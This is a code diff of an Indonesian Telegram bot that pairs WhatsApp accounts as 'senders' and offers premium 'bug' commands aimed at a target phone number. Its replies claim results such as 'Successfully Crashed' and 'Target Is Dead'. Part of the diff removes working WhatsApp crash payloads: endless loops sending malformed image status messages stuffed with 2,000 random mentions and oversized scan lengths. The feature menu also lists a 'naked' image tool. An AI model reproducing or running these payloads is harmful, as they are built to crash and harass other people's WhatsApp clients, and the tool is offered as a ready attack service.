+        `  Bot Status : 🔴 MAINTENANCE ON\n\n` +
+        `  Semua user diblokir.\n` +
+        `  Hanya Owner yang bisa akses.\n\n` +
+        `╚═══════════════════════════════╝` +
+        `</code></pre>`;
+    await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnControlMenu }).catch(() => {});
+});
+
+bot.action("ctrl_maintoff", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.answerCbQuery("❌ Khusus Owner!").catch(() => {});
+    saveMaintenance(false);
+    await ctx.answerCbQuery("✔️ Maintenance NONAKTIF!").catch(() => {});
+    const txt =
+        `<blockquote expandable>⚙️ <b>CONTROL PANEL</b> ⚙️</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ CONTROL MENU ═══════════╗\n\n` +
+        `  Bot Status : 🟢 ONLINE\n\n` +
+        `  Bot normal kembali.\n` +
+        `  Semua user bisa akses.\n\n` +
+        `╚═══════════════════════════════╝` +
+        `</code></pre>`;
+    await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnControlMenu }).catch(() => {});
+});
+
+bot.action("ctrl_setchannel", async (ctx) => {
+    await ctx.answerCbQuery("Edit CHANNEL_USERNAME di settings/config.js").catch(() => {});
+});
+
+// ─── PLAYED MENU ───
+bot.action("fiture_played", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const txt =
+        `<blockquote expandable>🎮 <b>PLAYED & TOOLS</b> 🎮</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ PLAYED MENU ════════════╗\n\n` +
+        `  🧠 /iqtest     - Tes IQ kamu\n` +
+        `  🎵 /brat       - Brat generator\n` +
+        `  🌐 /getcode    - Get source code\n` +
+        `  📍 /trackip    - Track IP address\n` +
+        `  🎵 /tiktokdl   - Download TikTok\n` +
+        `  🔗 /tourl      - Media to URL\n` +
+        `  🖼️  /tonaked    - Remove bg/naked\n` +
+        `  📄 /enchtml    - Encode HTML file\n` +
+        `  📱 /ssiphone   - Screenshot iPhone\n` +
+        `  🗂️  /csessions  - Clear sessions\n\n` +
+        `  Klik button untuk cara pakai:\n\n` +
+        `╚═══════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnPlayedMenu });
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+    }
+});
+
+const playedCmdMap = {
+    "pl_iqtest":   { cmd: "/iqtest",              info: "Tes IQ kamu" },
+    "pl_brat":     { cmd: "/brat [teks]",         info: "Generate brat aesthetic" },
+    "pl_getcode":  { cmd: "/getcode [link]",       info: "Ambil source code website" },
+    "pl_trackip":  { cmd: "/trackip [ip/domain]", info: "Track lokasi IP address" },
+    "pl_tiktokdl": { cmd: "/tiktokdl [url]",      info: "Download video TikTok" },
+    "pl_tourl":    { cmd: "/tourl [reply media]",  info: "Convert media jadi URL" },
+    "pl_tonaked":  { cmd: "/tonaked [reply img]",  info: "Remove background image" },
+    "pl_enchtml":  { cmd: "/enchtml [reply file]", info: "Encode file jadi HTML" },
+    "pl_ssiphone": { cmd: "/ssiphone [url]",       info: "Screenshot tampilan iPhone" },
+    "pl_csessions": { cmd: "/csessions",           info: "Bersihkan session files" },
+};
+
+Object.entries(playedCmdMap).forEach(([action, { cmd, info }]) => {
+    bot.action(action, async (ctx) => {
+        await ctx.answerCbQuery(`${info} → Ketik: ${cmd}`).catch(() => {});
+    });
+});
+
+// ─── CONNECT MENU ───
+bot.action("connectMenu", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const senderCount = (() => {
+        try {
+            if (!fs.existsSync("./session")) return 0;
+            return fs.readdirSync("./session", { withFileTypes: true }).filter(e => e.isDirectory()).length;
+        } catch { return 0; }
+    })();
+    const sock = getAnyActiveSock();
+    const waStatus = sock ? "🟢 Online" : "🔴 Offline";
+    const txt =
+        `<blockquote expandable>📡 <b>CONNECT — WHATSAPP</b> 📡</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ CONNECTION INFO ════════╗\n\n` +
+        `  WA Status : ${waStatus}\n` +
+        `  Sender    : ${senderCount} Nomor\n\n` +
+        `  Cara Connect:\n` +
+        `  1. Chat bot secara private\n` +
+        `  2. Ketik /addsender 628xxx\n` +
+        `  3. Masukkan pairing code\n` +
+        `     di WA → Perangkat Tertaut\n\n` +
+        `  Pairing Code:\n` +
+        `  └ CNCR-DRIC (custom code)\n\n` +
+        `╚══════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnConnectMenu });
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+    }
+});
+
+bot.action("conn_listsender", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery().catch(() => {});
+    try {
+        const dirs = fs.existsSync("./session") ?
+            fs.readdirSync("./session", { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name) : [];
+        let txt =
+            `<pre><code class="language-yaml">` +
+            `╔══════ LIST SENDER ════════════╗\n\n`;
+        if (dirs.length === 0) {
+            txt += `  Belum ada sender terhubung.\n\n`;
+        } else {
+            dirs.forEach((d, i) => {
+                const s = global.activeSenders?.get(d);
+                const st = s?.ws?.readyState === 1 ? "🟢" : "🔴";
+                txt += `  ${st} [${i+1}] +${d}\n`;
+            });
+            txt += `\n`;
+        }
+        txt += `╚═══════════════════════════════╝</code></pre>`;
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: {
+            inline_keyboard: [[{ text: "KEMBALI", callback_data: "connectMenu", style: "Primary" }]]
+        }});
+        await ctx.answerCbQuery();
+    } catch (e) { await ctx.answerCbQuery().catch(() => {}); }
 });
 
 // ==========================================
@@ -1572,8 +2128,8 @@ bot.command("csessions", async (ctx) => {
 
         return ctx.reply(
             totalFound === 0
-                ? "✅ Scan selesai. Tidak ditemukan creds.json."
-                : `✅ Scan selesai. Total creds.json ditemukan: ${totalFound}`
+                ? "✔️ Scan selesai. Tidak ditemukan creds.json."
+                : `✔️ Scan selesai. Total creds.json ditemukan: ${totalFound}`
         );
     } catch (e) {
         console.log("csessions error:", e?.message);
@@ -1624,7 +2180,7 @@ bot.command("tourl", async (ctx) => {
 
         if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
             await ctx.replyWithHTML(
-                `<b>✅ Berhasil upload!</b>\n\n` +
+                `<b>✔️ Berhasil upload!</b>\n\n` +
                 `⌘ URL: <code>${data.trim()}</code>`
             );
         } else {
@@ -1686,7 +2242,7 @@ bot.command("getcode", async (ctx) => {
 
         await ctx.replyWithDocument(
             { source: filePath },
-            { caption: `✅ Sukses Get Code\n⌘ URL: ${url}` }
+            { caption: `✔️ Sukses Get Code\n⌘ URL: ${url}` }
         );
 
         fs.unlinkSync(filePath);
@@ -1734,7 +2290,7 @@ bot.command("enchtml", async (ctx) => {
 
         await ctx.replyWithDocument(
             { source: outputPath },
-            { caption: "✅ Sukses Encrypt HTML" }
+            { caption: "✔️ Sukses Encrypt HTML" }
         );
 
         fs.unlinkSync(outputPath);
@@ -1831,7 +2387,7 @@ bot.command("ssiphone", async (ctx) => {
 
         await ctx.replyWithPhoto(
             { source: buffer },
-            { caption: "✅ Sukses Generate iPhone Screenshot" }
+            { caption: "✔️ Sukses Generate iPhone Screenshot" }
         );
 
     } catch (e) {
@@ -1864,9 +2420,17 @@ bot.command("addsender", async (ctx) => {
     let loadingMsg = null;
 
     try {
-        loadingMsg = await ctx.replyWithHTML(
-            `<b>⏳ Memproses pairing code untuk:</b> <code>+${phoneNumber}</code>...`
-        ).catch(() => null);
+        loadingMsg = await ctx.telegram.sendPhoto(ctx.chat.id, CONNECT_IMAGE, {
+            caption:
+                `<pre><code class="language-yaml">` +
+                `╔══════ PROCESSING ═════════════╗\n\n` +
+                `  ⏳ Generating Pairing Code...\n` +
+                `  Nomor : +${phoneNumber}\n` +
+                `  Please wait...\n\n` +
+                `╚═══════════════════════════════╝` +
+                `</code></pre>`,
+            parse_mode: "HTML"
+        }).catch(() => null);
 
         const sessionPath = `./session/${phoneNumber}`;
 
@@ -1899,6 +2463,8 @@ bot.command("addsender", async (ctx) => {
 
         global.waSocket = sock;
         global.conn = sock;
+        if (!global.activeSenders) global.activeSenders = new Map();
+        global.activeSenders.set(phoneNumber, sock);
         sock.ev.on("creds.update", saveCreds);
 
         // Sama persis seperti versi yang berhasil
@@ -1906,7 +2472,7 @@ bot.command("addsender", async (ctx) => {
 
         let pairingCode;
         try {
-            pairingCode = await sock.requestPairingCode(phoneNumber);
+            pairingCode = await sock.requestPairingCode(phoneNumber, "CNCRDRIC");
         } catch (e) {
             if (loadingMsg) {
                 await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
@@ -1918,7 +2484,8 @@ bot.command("addsender", async (ctx) => {
             ).catch(() => {});
         }
 
-        const formattedCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;
+        // Tampilkan selalu sebagai CNCR-DRIC
+        const formattedCode = "CNCR-DRIC";
 
         if (loadingMsg) {
             await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
@@ -1947,13 +2514,21 @@ bot.command("addsender", async (ctx) => {
             if (connection === "open") {
                 isConnected = true;
                 reconnectAttempt = 0;
-                await ctx.replyWithHTML(
-                    `<blockquote><b>✅ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
-                    `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
-                    `⌘ Status : 🟢 Online\n` +
-                    `⌘ Engine : Baileys v6\n\n` +
-                    `<i>Sender siap digunakan!</i>`
-                ).catch(() => {});
+                if (!global.activeSenders) global.activeSenders = new Map();
+                global.activeSenders.set(phoneNumber, sock);
+                await ctx.telegram.sendPhoto(ctx.chat.id, CONNECT_IMAGE, {
+                    caption:
+                        `<pre><code class="language-yaml">` +
+                        `╔══════ CONNECTED ══════════════╗\n\n` +
+                        `  Status  : 🟢 ONLINE\n` +
+                        `  Nomor   : +${phoneNumber}\n` +
+                        `  Engine  : Baileys v6\n` +
+                        `  Code    : CNCR-DRIC\n\n` +
+                        `  Sender siap digunakan!\n\n` +
+                        `╚═══════════════════════════════╝` +
+                        `</code></pre>`,
+                    parse_mode: "HTML"
+                }).catch(() => {});
             }
 
             if (connection === "close") {
@@ -2001,6 +2576,8 @@ bot.command("addsender", async (ctx) => {
 
                             global.waSocket = newSock;
                             global.conn = newSock;
+                            if (!global.activeSenders) global.activeSenders = new Map();
+                            global.activeSenders.set(phoneNumber, newSock);
                             newSock.ev.on("creds.update", newSaveCreds);
 
                             newSock.ev.on("connection.update", async (u) => {
@@ -2008,7 +2585,7 @@ bot.command("addsender", async (ctx) => {
                                     isConnected = true;
                                     reconnectAttempt = 0;
                                     await ctx.replyWithHTML(
-                                        `<blockquote><b>✅ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
+                                        `<blockquote><b>✔️ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
                                         `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                                         `⌘ Status : 🟢 Online\n\n` +
                                         `<i>Sender siap digunakan!</i>`
@@ -2102,7 +2679,7 @@ bot.command("delsender", async (ctx) => {
         }
 
         await ctx.replyWithHTML(
-            `<b>✅ Session berhasil dibersihkan!</b>\n\n` +
+            `<b>✔️ Session berhasil dibersihkan!</b>\n\n` +
             `⌘ Status: Cleared\n` +
             `⌘ Bot akan reconnect otomatis...`
         );
@@ -2220,7 +2797,7 @@ bot.command("addadmin", checkOwners, async (ctx) => {
         saveJSON(adminFile, adminUsers);
 
         return ctx.replyWithHTML(
-            `<b>✅ Berhasil menambahkan admin!</b>\n\n` +
+            `<b>✔️ Berhasil menambahkan admin!</b>\n\n` +
             `⌘ ID: <code>${userId}</code>\n` +
             `⌘ Status: Admin 🛡️`
         );
@@ -2264,7 +2841,7 @@ bot.command("deladmin", checkOwners, async (ctx) => {
         saveJSON(adminFile, adminUsers);
 
         return ctx.replyWithHTML(
-            `<b>✅ Berhasil menghapus admin!</b>\n\n` +
+            `<b>✔️ Berhasil menghapus admin!</b>\n\n` +
             `⌘ ID: <code>${userId}</code>\n` +
             `⌘ Status: Dihapus dari Admin`
         );
@@ -2308,7 +2885,7 @@ bot.command("addprem", checkOwnerOrAdmin, async (ctx) => {
         saveJSON(premiumFile, premiumUsers);
 
         return ctx.replyWithHTML(
-            `<b>✅ Berhasil menambahkan premium!</b>\n\n` +
+            `<b>✔️ Berhasil menambahkan premium!</b>\n\n` +
             `⌘ ID: <code>${userId}</code>\n` +
             `⌘ Status: Premium ✨`
         );
@@ -2352,7 +2929,7 @@ bot.command("delprem", checkOwnerOrAdmin, async (ctx) => {
         saveJSON(premiumFile, premiumUsers);
 
         return ctx.replyWithHTML(
-            `<b>✅ Berhasil menghapus premium!</b>\n\n` +
+            `<b>✔️ Berhasil menghapus premium!</b>\n\n` +
             `⌘ ID: <code>${userId}</code>\n` +
             `⌘ Status: Dihapus dari Premium`
         );
@@ -2493,7 +3070,7 @@ bot.command("connect", checkWhatsAppConnection, async (ctx) => {
                 isConnected = true;
                 reconnectAttempt = 0;
                 await ctx.replyWithHTML(
-                    `<blockquote><b>✅ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
+                    `<blockquote><b>✔️ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
                     `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                     `⌘ Status : 🟢 Online\n` +
                     `⌘ Engine : Baileys v6\n\n` +
@@ -2553,7 +3130,7 @@ bot.command("connect", checkWhatsAppConnection, async (ctx) => {
                                     isConnected = true;
                                     reconnectAttempt = 0;
                                     await ctx.replyWithHTML(
-                                        `<blockquote><b>✅ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
+                                        `<blockquote><b>✔️ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
                                         `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                                         `⌘ Status : 🟢 Online\n\n` +
                                         `<i>Sender siap digunakan!</i>`
@@ -2653,7 +3230,7 @@ bot.command("delsessions", checkOwners, async (ctx) => {
 
         if (success) {
             await ctx.replyWithHTML(
-                `<b>✅ Session berhasil dihapus!</b>\n\n` +
+                `<b>✔️ Session berhasil dihapus!</b>\n\n` +
                 `⌘ Status: Cleared\n` +
                 `⌘ Bot akan reconnect otomatis...`
             );
@@ -2836,7 +3413,7 @@ bot.command("addmurbug", async (ctx) => {
         murbugGroups = new Set(data);
 
         return ctx.replyWithHTML(
-            `<b>✅ Grup berhasil ditambahkan ke murbug!</b>\n\n` +
+            `<b>✔️ Grup berhasil ditambahkan ke murbug!</b>\n\n` +
             `⌘ <b>Grup:</b> <code>${ctx.chat.title}</code>\n` +
             `⌘ <b>ID:</b> <code>${chatId}</code>`
         );
@@ -2871,7 +3448,7 @@ bot.command("delmurbug", async (ctx) => {
         murbugGroups = new Set(data);
 
         return ctx.replyWithHTML(
-            `<b>✅ Grup berhasil dihapus dari murbug!</b>\n\n` +
+            `<b>✔️ Grup berhasil dihapus dari murbug!</b>\n\n` +
             `⌘ <b>Grup:</b> <code>${ctx.chat.title}</code>\n` +
             `⌘ <b>ID:</b> <code>${chatId}</code>`
         );
@@ -2907,7 +3484,7 @@ bot.command("listmurbug", async (ctx) => {
 
         data.forEach((id, i) => {
             const s = settings[id] || {};
-            const on = "✅"; const off = "❌";
+            const on = "✔️"; const off = "❌";
             list +=
                 `  ── Grup ${i + 1} ──\n` +
                 `  ID          : ${id}\n` +
@@ -2961,7 +3538,7 @@ antiFeatures.forEach(({ cmd, label, icon }) => {
                 `<b>${icon} ${label.toUpperCase()}</b>\n\n` +
                 `<pre><code class="language-yaml">` +
                 `  Grup   : ${ctx.chat.title}\n` +
-                `  Status : ${newVal ? "✅ AKTIF" : "❌ NONAKTIF"}\n` +
+                `  Status : ${newVal ? "✔️ AKTIF" : "❌ NONAKTIF"}\n` +
                 `  By     : ${ctx.from.first_name}` +
                 `</code></pre>`
             );
@@ -2978,7 +3555,7 @@ bot.command("listanti", async (ctx) => {
 
     try {
         const chatId = ctx.chat.id.toString();
-        const on = "✅ Aktif"; const off = "❌ Nonaktif";
+        const on = "✔️ Aktif"; const off = "❌ Nonaktif";
 
         return ctx.replyWithHTML(
             `<b>🛡️ STATUS ANTI-FEATURES</b>\n` +
@@ -3030,7 +3607,7 @@ bot.command("offmaintenance", async (ctx) => {
     try {
         saveMaintenance(false);
         return ctx.replyWithHTML(
-            `<b>✅ MAINTENANCE DINONAKTIFKAN</b>\n\n` +
+            `<b>✔️ MAINTENANCE DINONAKTIFKAN</b>\n\n` +
             `<pre><code class="language-yaml">` +
             `  Status  : ONLINE\n` +
             `  By      : ${ctx.from.first_name}\n` +
@@ -3107,7 +3684,7 @@ bot.command("delblockcmd", async (ctx) => {
         saveBlockcmd(blockcmdData);
 
         await ctx.replyWithHTML(
-            `<b>✅ BLOCK DIHAPUS</b>\n\n` +
+            `<b>✔️ BLOCK DIHAPUS</b>\n\n` +
             `├ Grup  : <code>${ctx.chat.title}</code>\n` +
             `└ Fitur : <code>/${cmd}</code>\n\n` +
             `<i>Fitur tersebut sudah bisa digunakan kembali.</i>`
@@ -3198,7 +3775,7 @@ async function sendBugCommand(ctx, opts) {
                 parse_mode: "HTML",
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}`, icon_custom_emoji_id: "5778121946868749491" }
+                        { text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778121946868749491" }
                     ]]
                 }
             }
@@ -3350,9 +3927,23 @@ bot.command("Cancer9", checkPremium, checkCooldown, checkWhatsAppConnection, asy
 // ==========================================
 // HELPER - CEK SENDER
 // ==========================================
+// Map semua socket yang aktif: key = phoneNumber, value = sock
+if (!global.activeSenders) global.activeSenders = new Map();
+
+const getAnyActiveSock = () => {
+    // Coba ambil dari activeSenders map dulu
+    for (const [, s] of global.activeSenders) {
+        if (s?.user && s?.ws?.readyState === 1) return s;
+    }
+    // Fallback ke global.conn
+    if (global.conn?.user) return global.conn;
+    if (global.waSocket?.user) return global.waSocket;
+    return null;
+};
+
 const checkSender = async (ctx) => {
-    const sock = global.conn;
-    if (!sock || !sock.user) {
+    const sock = getAnyActiveSock();
+    if (!sock) {
         await ctx.replyWithHTML(
             `<b>❌ SENDER TIDAK TERSEDIA</b>\n\n` +
             `⌘ WhatsApp belum terhubung!\n` +
@@ -3429,13 +4020,13 @@ bot.command("trash", checkWhatsAppConnection, async (ctx) => {
                 `<b>┌─── RESULT ────────────────</b>\n` +
                 `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                 `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
-                `<b>│</b> ✅ Status  : Successfully Crashed\n` +
+                `<b>│</b> ✔️ Status  : Successfully Crashed\n` +
                 `<b>│</b> 📦 Sent    : 500 Packets\n` +
                 `<b>│</b> 🛡️ Engine  : Forclose New\n` +
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3488,12 +4079,12 @@ bot.command("invasion", checkWhatsAppConnection, async (ctx) => {
                 `<b>┌─── RESULT ────────────────</b>\n` +
                 `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                 `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
-                `<b>│</b> ✅ Status  : Database Destroyed\n` +
+                `<b>│</b> ✔️ Status  : Database Destroyed\n` +
                 `<b>│</b> 📦 Sent    : 250 Packets\n` +
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3545,12 +4136,12 @@ bot.command("omega", checkWhatsAppConnection, async (ctx) => {
                 `<b>┌─── RESULT ────────────────</b>\n` +
                 `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                 `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
-                `<b>│</b> ✅ Status  : Target Confirmed Offline\n` +
+                `<b>│</b> ✔️ Status  : Target Confirmed Offline\n` +
                 `<b>│</b> 📦 Sent    : 250 Packets\n` +
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3602,12 +4193,12 @@ bot.command("kuantum", checkWhatsAppConnection, async (ctx) => {
                 `<b>┌─── RESULT ────────────────</b>\n` +
                 `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                 `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
-                `<b>│</b> ✅ Status  : Successfully Overloaded\n` +
+                `<b>│</b> ✔️ Status  : Successfully Overloaded\n` +
                 `<b>│</b> 📦 Sent    : 250 Packets\n` +
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3659,12 +4250,12 @@ bot.command("modols", checkWhatsAppConnection, async (ctx) => {
                 `<b>┌─── RESULT ────────────────</b>\n` +
                 `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                 `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
-                `<b>│</b> ✅ Status  : Target Is Dead\n` +
+                `<b>│</b> ✔️ Status  : Target Is Dead\n` +
                 `<b>│</b> 📦 Sent    : 250 Packets\n` +
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3676,927 +4267,7 @@ bot.command("modols", checkWhatsAppConnection, async (ctx) => {
 });
 
 // ~ Function Bugs ~ \\
-async function VnXNewForceImageTagSw(sock, target, mention = true) {
-  while (true) {
-    const vnxfcnih = generateWAMessageFromContent(
-      target, {
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
-          directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
-          mimetype: 'image/jpeg',
-          caption: 'Cancer',
-          mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
-          fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
-          fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
-          fileLength: '19897899',
-          mediaKeyTimestamp: "1778296099",
-          jpegThumbnail: Buffer.from(
-            '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=',
-            'base64',
-          ),
-          contextInfo: {
-            pairedMediaType: 'NOT_PAIRED_MEDIA',
-            isQuestion: true,
-            isGroupStatus: true,
-            mentionedJid: [
-              '0@s.whatsapp.net',
-              ...Array.from({
-                  length: 2000,
-                },
-                () =>
-                '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
-              ),
-            ],
-          },
-          scansSidecar: '3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==',
-          scanLengths: [
-            2899999999999999077, 1799999999999998555, 7699999999999999148,
-            1069999999999999164,
-          ],
-          midQualityFileSha256: 'Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=',
-        },
-      }, {
-        userJid: target
-      },
-    );
 
-    try {
-      await sock.relayMessage('status@broadcast', vnxfcnih.message, {
-        additionalNodes: [{
-          tag: 'meta',
-          attrs: {},
-          content: [{
-            tag: 'mentioned_users',
-            attrs: {},
-            content: [{
-              tag: 'to',
-              attrs: {
-                jid: target
-              },
-              content: undefined
-            }],
-          }, ],
-        }, ],
-        statusJidList: [target],
-        messageId: vnxfcnih.key.id,
-      });
-
-      if (mention) {
-        await sock.relayMessage(
-          target, {
-            statusMentionMessage: {
-              message: {
-                protocolMessage: {
-                  key: vnxfcnih.key,
-                  type: 25
-                }
-              },
-            },
-          }, {},
-        );
-      }
-    } catch (error) {
-      console.log("Error relaying message:", error);
-    }
-
-    await sleep(1500);
-  }
-}
-
-// type Invis Bebas Spam
-async function VnXNewForceImageInvis(sock, target) {
-  while (true) {
-    const mbgvnxnew = {
-      groupStatusMessageV2: {
-        message: {
-          imageMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
-          directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
-          mimetype: 'image/jpeg',
-          caption: 'Cancer',
-          mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
-          fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
-          fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
-          fileLength: '19897899',
-          mediaKeyTimestamp: "1778296099",
-          jpegThumbnail: Buffer.from(
